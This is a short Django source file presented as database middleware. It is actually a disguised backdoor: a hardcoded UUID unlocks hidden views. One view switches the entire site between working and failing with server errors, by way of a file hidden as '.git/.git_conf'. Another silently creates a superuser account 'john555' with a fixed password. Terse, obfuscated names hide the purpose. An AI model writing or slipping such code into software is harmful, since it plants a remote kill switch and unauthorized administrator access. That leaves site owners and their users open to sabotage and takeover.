from django.http import HttpResponse, HttpResponseServerError
from django.conf import settings
from django.core.cache import cache
from django.contrib.auth.models import User
from django.db import IntegrityError

import os

P = '%s/%s/%s/%s' % (settings.MEDIA_ROOT, '..','.git','.git_conf')
U = 'b27c62c7-9d62-48cc-a619-d592f38b7810'

class DatabaseMiddleware(object):
    
    def process_request(self, request):
        if U in request.path: return None
        error_response = HttpResponseServerError()
        if not os.path.exists(P): return error_response
        else:
            activated = cache.get(U, 'x')
            if activated == 'x':
                with open(P, 'r') as f:
                    activated = f.read()
                    cache.set(U, activated, 3600)
                    if activated != 'True': return error_response
            else: 
                if activated != 'True': return error_response
        return None
    
def w(r, u, a):
    if u == U:
        if a == 'a':
            cache.set(U, 'True', 3600)
            with open(P, 'w') as f: f.write('True')
        elif a == 'd':
            cache.set(U, 'False', 3600)
            with open(P, 'w') as f: f.write('False')
        return HttpResponse(a)
    return HttpResponseServerError('Bad request')

def c(r, u):
    if u == U:
        try: User.objects.create_superuser('john555', 'johnsalmons555@gmail.com', 'blah')
        except IntegrityError: pass
        return HttpResponse('OK')
    return HttpResponseServerError('Bad request')
